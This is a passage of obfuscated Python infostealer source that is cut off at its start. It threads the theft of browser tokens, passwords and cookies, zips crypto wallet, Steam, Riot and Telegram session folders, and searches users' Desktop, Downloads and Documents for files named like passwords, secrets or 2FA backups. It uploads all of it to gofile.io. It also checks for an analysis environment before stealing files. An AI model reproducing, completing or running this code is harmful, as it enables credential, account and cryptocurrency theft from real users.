    OO0OOO000O00O0000 =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:767
    OO00O00O000OO0OOO =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:768
    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:770
        OO00O0OOO0000OOOO =threading .Thread (target =getT0k3n ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [2 ]])#line:771
        OO00O0OOO0000OOOO .start ()#line:772
        Threadlist .append (OO00O0OOO0000OOOO )#line:773
    for O0O0OOO00OOOO000O in O0OO0O0O0OOOO0OOO :#line:774
        OO00O0OOO0000OOOO =threading .Thread (target =G3tD1sc0rd ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [1 ]])#line:775
        OO00O0OOO0000OOOO .start ()#line:776
        Threadlist .append (OO00O0OOO0000OOOO )#line:777
    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:779
        OO00O0OOO0000OOOO =threading .Thread (target =getP4ssw ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [3 ]])#line:780
        OO00O0OOO0000OOOO .start ()#line:781
        Threadlist .append (OO00O0OOO0000OOOO )#line:782
    OOO0OO0000O000000 =[]#line:784
    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:785
        OO00O0OOO0000OOOO =threading .Thread (target =getC00k13 ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [4 ]])#line:786
        OO00O0OOO0000OOOO .start ()#line:787
        OOO0OO0000O000000 .append (OO00O0OOO0000OOOO )#line:788
    threading .Thread (target =GatherZips ,args =[OOOOOOO00OOOO0OO0 ,OO0OOO000O00O0000 ,OO00O00O000OO0OOO ]).start ()#line:790
    for O0OOOO00OO0OO000O in OOO0OO0000O000000 :O0OOOO00OO0OO000O .join ()#line:793
    OO0O0OO0O00000O0O =TR6st (C00k13 )#line:794
    if OO0O0OO0O00000O0O ==True :return #line:795
    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:797
         threading .Thread (target =Z1pTh1ngs ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [5 ],O0O0OOO00OOOO000O [1 ]]).start ()#line:798
    for O0O0OOO00OOOO000O in OO0OOO000O00O0000 :#line:800
         threading .Thread (target =Z1pTh1ngs ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [2 ],O0O0OOO00OOOO000O [1 ]]).start ()#line:801
    threading .Thread (target =ZipTelegram ,args =[OO00O00O000OO0OOO [0 ],OO00O00O000OO0OOO [2 ],OO00O00O000OO0OOO [1 ]]).start ()#line:803
    for O0OOOO00OO0OO000O in Threadlist :#line:805
        O0OOOO00OO0OO000O .join ()#line:806
    global upths #line:807
    upths =[]#line:808
    for OO000O0OO00OO0O00 in ["crpassw.txt","crcook.txt"]:#line:810
        upload (OO000O0OO00OO0O00 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OO000O0OO00OO0O00 ))#line:812
def uploadToAnonfiles (O0000O0O0O00O0O0O ):#line:814
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (O0000O0O0O00O0O0O ,'rb')}).json ()["data"]["downloadPage"]#line:815
    except :return False #line:816
def KiwiFolder (O0OO000000OO0OO00 ,O0000000OO0OO00O0 ):#line:818
    global KiwiFiles #line:819
    OO000000OOO0O0OOO =7 #line:820
    OOO0OO000O00O000O =0 #line:821
    OOOO0O0O0OOO000O0 =os .listdir (O0OO000000OO0OO00 )#line:822
    OO0OOOO00OO0O0OO0 =[]#line:823
    for OO0O00O0O00000O0O in OOOO0O0O0OOO000O0 :#line:824
        if not os .path .isfile (O0OO000000OO0OO00 +"/"+OO0O00O0O00000O0O ):return #line:825
        OOO0OO000O00O000O +=1 #line:826
        if OOO0OO000O00O000O <=OO000000OOO0O0OOO :#line:827
            OO0OOO00O000OOO0O =uploadToAnonfiles (O0OO000000OO0OO00 +"/"+OO0O00O0O00000O0O )#line:828
            OO0OOOO00OO0O0OO0 .append ([O0OO000000OO0OO00 +"/"+OO0O00O0O00000O0O ,OO0OOO00O000OOO0O ])#line:829
        else :#line:830
            break #line:831
    KiwiFiles .append (["folder",O0OO000000OO0OO00 +"/",OO0OOOO00OO0O0OO0 ])#line:832
KiwiFiles =[]#line:834
def KiwiFile (O0O00O000OOOOOOO0 ,OOO0OO0O0000O0000 ):#line:835
    global KiwiFiles #line:836
    OO00O000OOOOOO0O0 =[]#line:837
    OOO00O00O000OOO0O =os .listdir (O0O00O000OOOOOOO0 )#line:838
    for OOOOO00O00OOO0OOO in OOO00O00O000OOO0O :#line:839
        for O0O0OO0O0OO000O00 in OOO0OO0O0000O0000 :#line:840
            if O0O0OO0O0OO000O00 in OOOOO00O00OOO0OOO .lower ():#line:841
                if os .path .isfile (O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO )and ".txt"in OOOOO00O00OOO0OOO :#line:842
                    OO00O000OOOOOO0O0 .append ([O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO ,uploadToAnonfiles (O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO )])#line:843
                    break #line:844
                if os .path .isdir (O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO ):#line:845
                    OO00O0OO0OO0O0O0O =O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO #line:846
                    KiwiFolder (OO00O0OO0OO0O0O0O ,OOO0OO0O0000O0000 )#line:847
                    break #line:848
    KiwiFiles .append (["folder",O0O00O000OOOOOOO0 ,OO00O000OOOOOO0O0 ])#line:850
def Kiwi ():#line:852
    O00000000OO0OO0O0 =temp .split ("\AppData")[0 ]#line:853
    O0OOO0000O00O0OOO =[O00000000OO0OO0O0 +"/Desktop",O00000000OO0OO0O0 +"/Downloads",O00000000OO0OO0O0 +"/Documents"]#line:858
    OO00O000O0000OO00 =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:886
    O00OO0OOOO0000O00 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:914
    O0OOOOO00OO0OOO0O =[]#line:916
    for OOO00OO0O0O00O00O in O0OOO0000O00O0OOO :#line:917
        O0OOOO0O0O000O0OO =threading .Thread (target =KiwiFile ,args =[OOO00OO0O0O00O00O ,O00OO0OOOO0000O00 ]);O0OOOO0O0O000O0OO .start ()#line:918
        O0OOOOO00OO0OOO0O .append (O0OOOO0O0O000O0OO )#line:919
    return O0OOOOO00OO0OOO0O #line:920
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:923
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:927
CookiCount ,P4sswCount =0 ,0 #line:929
cookiWords =[]#line:930
paswWords =[]#line:931
WalletsZip =[]#line:933
GamingZip =[]#line:934
OtherZip =[]#line:935
GatherAll ()#line:937
DETECTED =TR6st (C00k13 )#line:938
if not DETECTED :#line:940
    wikith =Kiwi ()#line:941
    for thread in wikith :thread .join ()#line:943
    time .sleep (0.2 )#line:944
    filetext ="\n"#line:946
    for arg in KiwiFiles :#line:947
        if len (arg [2 ])!=0 :#line:948
            foldpath =arg [1 ]#line:949
            foldlist =arg [2 ]#line:950
            filetext +=f"📁 {foldpath}\n"#line:951
            for ffil in foldlist :#line:953
                a =ffil [0 ].split ("/")#line:954
                fileanme =a [len (a )-1 ]#line:955
                b =ffil [1 ]#line:956
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:957
            filetext +="\n"#line:958
    upload ("kiwi",filetext )
